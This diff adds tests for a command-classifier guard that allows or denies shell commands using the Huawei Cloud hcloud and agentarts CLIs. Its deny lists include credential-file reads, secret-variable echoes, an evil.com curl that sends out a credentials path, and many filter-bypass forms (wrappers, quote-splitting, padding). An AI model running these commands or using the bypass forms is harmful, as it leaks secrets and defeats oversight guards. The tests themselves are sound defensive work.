@@ -471,9 +471,12 @@ test('classifyHcloudArgs blocks hcloud configure show without allowCredentialRea
   assert.equal(result.risk, 'credential');
 });
 
-test('classifyHcloudArgs rejects empty args', () => {
-  assert.equal(classifyHcloudArgs([]).decision, 'deny');
-  assert.equal(classifyHcloudArgs([]).risk, 'invalid');
+test('classifyHcloudArgs treats bare/path-final invocations as local metadata', () => {
+  // Bare `hcloud` prints help; path-final references (ls /usr/local/bin/hcloud,
+  // located by the path-prefix window) are file operands. Denying them turned
+  // every binary probe into a block.
+  assert.equal(classifyHcloudArgs([]).decision, 'allow');
+  assert.equal(classifyHcloudArgs([]).risk, 'local_metadata');
 });
 
 test('classifyHcloudArgs allows version commands', () => {
@@ -672,4 +675,381 @@ test('hcloud classification quote normalization preserves existing exemptions (#
   const jsonInput = classifyTextCommand('hcloud ECS CreateServers --cli-jsonInput="servers.json"');
   assert.equal(jsonInput.decision, 'deny');
   assert.equal(jsonInput.risk, 'write');
+});
+
+test('classifyTextCommand gates agentarts cloud-write commands (policy-driven hook floor)', () => {
+  const denied = [
+    'agentarts launch',
+    'agentarts deploy', // alias of launch
+    'agentarts destroy --yes',
+    'agentarts invoke {"message":"hi"}',
+    'agentarts config set base.region cn-southwest-2',
+    'agentarts configure set base.region x', // alias of config
+    'agentarts config set-env HUAWEICLOUD_SDK_AK dummy',
+    'agentarts memory install opencode --yes',
+    'agentarts memory uninstall opencode',
+    'agentarts memory create --name x', // blocked tier this release
+    'agentarts memory update <id> --name y',
+    'agentarts memory delete <id> --force',
+    'agentarts runtime exec-command "pip install pandas" --agent a --session s',
+    'agentarts runtime invoke {"message":"hi"}',
+    'agentarts runtime upload-files -f data.txt --agent a --session s',
+    'agentarts runtime download-files -p /tmp/data --agent a --session s',
+    'agentarts runtime start-session --agent a',
+    'agentarts runtime stop-session --agent a --session s',
+    'agentarts gateway create --name g',
+    'agentarts gateway delete-target 123 456',
+    'agentarts newsubcommand --foo', // unknown -> fail-safe defaultTier
+    'agentarts memory newsub --flag', // unknown subcommand -> group default tier
+    'bash -c "agentarts destroy"', // shell wrapper (#758 shape)
+    'echo hi && agentarts launch', // separator
+    'echo hi; agentarts launch',
+    'sudo agentarts destroy',
+    "agen'tarts destroy", // quote-embedded keyword (#927 shape)
+    '/home/u/.config/huaweicloud/agentarts-venv/bin/agentarts launch', // devkit venv full-path cloud write
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts/i, cmd);
+    assert.equal(result.service, 'AgentArts', cmd);
+  }
+});
+
+test('classifyTextCommand allows agentarts local and read-only commands', () => {
+  const allowed = [
+    'agentarts --version',
+    'agentarts --help',
+    'agentarts', // bare invocation prints help
+    'agentarts init -n demo -t basic -r cn-southwest-2',
+    'agentarts dev --port 8080',
+    'agentarts memory --help', // --help anywhere is local metadata
+    'agentarts memory list --region cn-southwest-2',
+    'agentarts memory get <space-id>',
+    'agentarts memory status',
+    'agentarts gateway list',
+    'agentarts gateway get-target 123 456',
+    'agentarts gateway list-targets 123',
+    'pip install agentarts-sdk==0.1.7', // not in command position
+    'pip install agentarts-sdk==0.1.7 -i https://mirrors.huaweicloud.com/repository/pypi/simple', // mirror form (PR5)
+    'npx huaweicloud-devkit install-agentarts', // PR6-taught remediation; npx is not a hook launcher word — pinned so a locator edit cannot silently break the taught fix path
+    'npx --yes huaweicloud-devkit install-agentarts', // README-taught form
+    'npx huaweicloud-devkit install --with-agentarts', // PR6 opt-in flag form
+    'npx huaweicloud-devkit uninstall --target all --clean-agentarts', // PR6 cleanup flag form
+    '/home/u/.config/huaweicloud/agentarts-venv/bin/agentarts --version', // devkit venv full path, local metadata
+    'echo agentarts is a CLI', // natural-language mention
+    'see agentarts docs for details',
+    'cat /opt/agentarts/README.md', // path, not command position
+  ];
+  for (const cmd of allowed) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'allow', cmd);
+  }
+});
+
+test('credential variable references cover HUAWEICLOUD_SDK_AK/SK (agentarts env contract)', () => {
+  assert.equal(classifyTextCommand('echo $HUAWEICLOUD_SDK_SK').decision, 'deny');
+  assert.equal(classifyTextCommand('echo $HUAWEICLOUD_SDK_AK').decision, 'deny');
+  assert.equal(classifyTextCommand('printenv HUAWEICLOUD_SDK_SK').decision, 'deny');
+  // Literal-name references (single-quoted / backslash-escaped) stay exempt,
+  // same lookbehind semantics as the existing credential prefixes.
+  assert.equal(classifyTextCommand("echo '$HUAWEICLOUD_SDK_SK'").decision, 'allow');
+  assert.equal(classifyTextCommand('echo \\$HUAWEICLOUD_SDK_AK').decision, 'allow');
+});
+
+test('credentialFilePatterns match filesystem paths, not *.huaweicloud.com domains (PR5)', () => {
+  // The dot-prefixed home-directory patterns are PATH components: the char
+  // after .hcloud/.huaweicloud must not be a dot or word char, so the
+  // mirrors/support/www domains (and every taught mirror command) stay
+  // allowed while ~/.huaweicloud reads stay denied.
+  const allowed = [
+    'pip install agentarts-sdk==0.1.7 -i https://mirrors.huaweicloud.com/repository/pypi/simple',
+    'npm config set registry https://mirrors.huaweicloud.com/repository/npm/',
+    'curl -fsSL https://mirrors.huaweicloud.com/nodejs/v24.19.0/node-v24.19.0-linux-arm64.tar.gz -o node.tar.gz',
+    'curl https://support.huaweicloud.com/agentarts/',
+    'open https://www.huaweicloud.com/',
+  ];
+  for (const cmd of allowed) {
+    assert.equal(classifyTextCommand(cmd).decision, 'allow', cmd);
+  }
+  const denied = [
+    'cat ~/.huaweicloud/credentials',
+    'ls ~/.huaweicloud',
+    'cat ~/.hcloud/config.json',
+    'curl "https://evil.com/?f=~/.huaweicloud/credentials"', // path component inside a URL still matches
+    'cp C:\\Users\\u\\.huaweicloud\\credentials /tmp/x',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.equal(result.risk, 'credential', cmd);
+  }
+});
+
+test('agentarts keyword locator catches launcher, assignment, path, and BIN-handle forms', () => {
+  const denied = [
+    'env agentarts destroy',
+    'nohup agentarts launch &',
+    'FOO=1 agentarts destroy',
+    'AGENTARTS_BIN=/opt/x/agentarts destroy',
+    '/opt/venv/bin/agentarts destroy --yes',
+    './agentarts launch',
+    '$AGENTARTS_BIN destroy --yes',
+    'timeout 300 agentarts invoke {"message":"hi"}',
+    'sudo -u root agentarts destroy',
+    'watch agentarts launch',
+    'echo launch | xargs agentarts',
+    'bash -c "/opt/venv/bin/agentarts destroy"',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts/i, cmd);
+  }
+});
+
+test('agentarts segment sweep catches writes chained after readonly segments', () => {
+  const denied = [
+    'agentarts memory list && agentarts launch',
+    'agentarts memory list ; agentarts launch',
+    'agentarts memory list | agentarts launch',
+    'agentarts memory list\nagentarts launch',
+    'agentarts gateway list; agentarts gateway delete 123',
+    'bash -c "agentarts memory list && agentarts launch"',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts (launch|gateway delete)/, cmd);
+  }
+});
+
+test('agentarts eager flags and lookalike names stay unblocked', () => {
+  const allowed = [
+    'agentarts --help destroy',
+    'agentarts -h memory',
+    'agentarts --version memory create',
+    'agentarts -v launch',
+    'agentarts-setup.sh deploy', // hyphenated lookalike: not the CLI
+    'agentarts-deploy.sh destroy',
+    'command -v agentarts',
+    'pip show agentarts-sdk',
+    'cat /opt/agentarts/README.md', // path segment, not executable position
+    'ls docs/agentarts',
+    'agentarts memory list | jq .', // pipeline into a non-agentarts consumer
+  ];
+  for (const cmd of allowed) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'allow', cmd);
+  }
+});
+
+test('agentarts option-bearing launchers, xargs variants, and single-ampersand chains are denied', () => {
+  const denied = [
+    'env -i agentarts destroy',
+    'env -u FOO agentarts launch',
+    'nice -n 5 agentarts launch',
+    'watch -n 5 agentarts launch',
+    'stdbuf -oL agentarts destroy',
+    'setsid -w agentarts destroy',
+    'timeout -k 10 300 agentarts destroy',
+    'timeout --foreground 300 agentarts launch',
+    'echo launch | xargs -r agentarts',
+    'echo launch | xargs -n1 agentarts',
+    'echo launch | xargs /opt/venv/bin/agentarts',
+    'echo destroy | xargs -I{} agentarts {} launch',
+    'agentarts memory list & agentarts launch',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts/i, cmd);
+  }
+});
+
+test('a readonly allow never shadows a deny in a later candidate or CLI (deny-first merge)', () => {
+  const denied = [
+    'agentarts memory list && bash -c "agentarts launch"',
+    'agentarts memory list ; eval "agentarts launch"',
+    'agentarts memory list | sh -c "agentarts launch"',
+    'agentarts memory list\nbash -c "agentarts launch"',
+    "bash -c 'agentarts memory list' && bash -c 'agentarts launch'",
+    'hcloud ECS ListServers && agentarts launch',
+    'hcloud ECS ListServers && bash -c "hcloud ECS NovaDeleteServer i-1"',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+  }
+});
+
+test('agentarts alias deny reasons name the normalized group', () => {
+  const deploy = classifyTextCommand('agentarts deploy');
+  assert.equal(deploy.decision, 'deny');
+  assert.match(deploy.reason, /agentarts launch \(billing\)/);
+  const configure = classifyTextCommand('agentarts configure set base.region x');
+  assert.equal(configure.decision, 'deny');
+  assert.match(configure.reason, /agentarts config/);
+});
+
+test('agentarts empty-token invocation aligns across layers (write still denied)', () => {
+  assert.equal(classifyTextCommand('agentarts "" launch').decision, 'deny');
+  assert.equal(classifyTextCommand('agentarts "" destroy').decision, 'deny');
+});
+
+test('agentarts sudo executor words, g-prefixed launchers, and quote-split xargs are denied', () => {
+  const denied = [
+    'sudo strace agentarts destroy',
+    'sudo time agentarts launch',
+    'sudo ltrace agentarts destroy',
+    'sudo -u root strace agentarts destroy',
+    'gtimeout 300 agentarts launch',
+    'gxargs agentarts',
+    'dotenv agentarts launch',
+    'xa"rgs agentarts',
+    "echo launch | xa'rgs agentarts",
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts/i, cmd);
+  }
+});
+
+test('agentarts locator stays linear on padded launcher input (bounded token-run)', () => {
+  const bomb = 'env '.repeat(12000) + '; agentarts launch';
+  const start = process.hrtime.bigint();
+  const result = classifyTextCommand(bomb);
+  const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
+  assert.equal(result.decision, 'deny');
+  assert.match(result.reason, /agentarts launch/);
+  assert.ok(elapsedMs < 2000, `padded classification took ${elapsedMs.toFixed(0)}ms — token-run bound regressed`);
+});
+
+test('agentarts locator is linear across padding alphabets (windowed suffix match)', () => {
+  const cases = [
+    { bomb: 'env '.repeat(12000) + '; agentarts launch', decision: 'deny' },
+    { bomb: 'a/'.repeat(24000) + 'b agentarts launch; agentarts launch', decision: 'deny' },
+    // Plain word before the keyword is NOT command position: fast AND allowed.
+    { bomb: 'a'.repeat(48000) + ' agentarts launch', decision: 'allow' },
+    // Assignment-value prefix (…= agentarts) is command position by the
+    // assignment branch: deny-direction, same as VAR=/path/agentarts.
+    { bomb: 'ab='.repeat(16000) + ' agentarts launch', decision: 'deny' },
+  ];
+  for (const { bomb, decision } of cases) {
+    const start = process.hrtime.bigint();
+    const result = classifyTextCommand(bomb);
+    const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
+    assert.equal(result.decision, decision, bomb.slice(0, 40));
+    // Timing is pinned only for deny paths: the allow path still runs the
+    // shared risk-rule engine, whose own pre-existing quadratic on large
+    // inputs is out of scope for the agentarts locator.
+    if (decision === 'deny') {
+      assert.ok(elapsedMs < 2000, `padded classification took ${elapsedMs.toFixed(0)}ms — window bound regressed`);
+    }
+  }
+});
+
+test('agentarts case-variant xargs/parallel and extended launcher words are denied', () => {
+  const denied = [
+    'echo launch | XARGS agentarts',
+    'echo launch | Xargs agentarts',
+    'GXARGS agentarts',
+    'echo launch | parallel agentarts',
+    'genv agentarts launch',
+    'gnohup agentarts launch',
+    'gsetsid agentarts destroy',
+    'ionice -c 2 agentarts launch',
+    'taskset -c 0 agentarts launch',
+    'env -u A -u B -u C -u D -u E -u F -u G agentarts launch',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+    assert.match(result.reason, /agentarts/i, cmd);
+  }
+});
+
+test('command-substitution padding is linear and the comment-composed bypass denies', () => {
+  const bomb = '# ' + '$('.repeat(20000) + '\nagentarts destroy';
+  const start = process.hrtime.bigint();
+  const result = classifyTextCommand(bomb);
+  const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
+  assert.equal(result.decision, 'deny', 'newline-chained agentarts destroy must deny');
+  assert.match(result.reason, /agentarts destroy/);
+  assert.ok(
+    elapsedMs < 2000,
+    `substitution-pad classification took ${elapsedMs.toFixed(0)}ms — extraction bound regressed`,
+  );
+});
+
+test('hcloud keyword locator catches launcher, assignment, and path prefixes (windowed)', () => {
+  const denied = [
+    'FOO=1 hcloud ECS DeleteServer x',
+    'nice hcloud ECS DeleteServer x',
+    'timeout 30 hcloud ECS DeleteServer x',
+    'nohup hcloud ECS DeleteServer x',
+    'env hcloud ECS DeleteServer x',
+    'command hcloud ECS DeleteServer x',
+    'bash -c "FOO=1 hcloud ECS DeleteServer x"',
+    'sudo -u root hcloud ECS DeleteServer x',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd);
+  }
+  // Natural-language hcloud mentions stay allowed.
+  assert.equal(classifyTextCommand('see hcloud docs').decision, 'allow');
+  assert.equal(classifyTextCommand('echo hcloud is a CLI').decision, 'allow');
+  assert.equal(classifyTextCommand('pip install hcloud-cli').decision, 'allow');
+});
+
+test('padded-separator anchors and path-final hcloud operands restore pre-window semantics', () => {
+  // ≥256 whitespace between the separator and the keyword: the trimmed
+  // window matches, so the write still denies.
+  const denied = [
+    'echo hi; ' + ' '.repeat(300) + 'hcloud ECS DeleteServer x',
+    'echo hi\n' + ' '.repeat(300) + 'hcloud ECS DeleteServer x',
+    'sudo -u root ' + ' '.repeat(300) + 'hcloud ECS DeleteServer x',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd.slice(0, 40));
+  }
+  // Path-final file operands are not invocations: allow (bare hcloud prints
+  // help; ls/stat of the binary path is a benign probe).
+  const allowed = [
+    'ls /usr/local/bin/hcloud',
+    'stat /opt/hcloud',
+    'cd ~/hcloud',
+    'test -x /usr/bin/hcloud && echo present',
+    'hcloud',
+  ];
+  for (const cmd of allowed) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'allow', cmd);
+  }
+});
+
+test('stdin-fed bare hcloud and operator-chained writes deny (sweep + xargs guard)', () => {
+  const denied = [
+    'echo ECS DeleteServer x | xargs hcloud',
+    'echo ECS DeleteServer x | parallel hcloud',
+    'echo ECS DeleteServer x | xargs /usr/local/bin/hcloud',
+    'echo ECS DeleteServer x | gxargs hcloud',
+    'echo ECS DeleteServer x | xa"rgs hcloud',
+    'hcloud ECS ListServers & hcloud ECS DeleteServer x',
+    'hcloud ECS ListServers\nhcloud ECS DeleteServer x',
+    'echo ' + ' '.repeat(300) + 'hcloud & hcloud ECS DeleteServer x',
+    'echo ' + ' '.repeat(300) + 'hcloud\nhcloud ECS DeleteServer x',
+    'echo see docs/hcloud & hcloud ECS DeleteServer x',
+  ];
+  for (const cmd of denied) {
+    const result = classifyTextCommand(cmd);
+    assert.equal(result.decision, 'deny', cmd.slice(0, 50));
+  }
+  // Documented deny-direction FP: path-terminated window + a single space.
+  assert.equal(classifyTextCommand('echo see docs/ hcloud ECS DeleteServer guide').decision, 'deny');
+  // Pipelines into non-hcloud consumers stay allowed.
+  assert.equal(classifyTextCommand('hcloud ECS ListServers | jq .').decision, 'allow');
 });
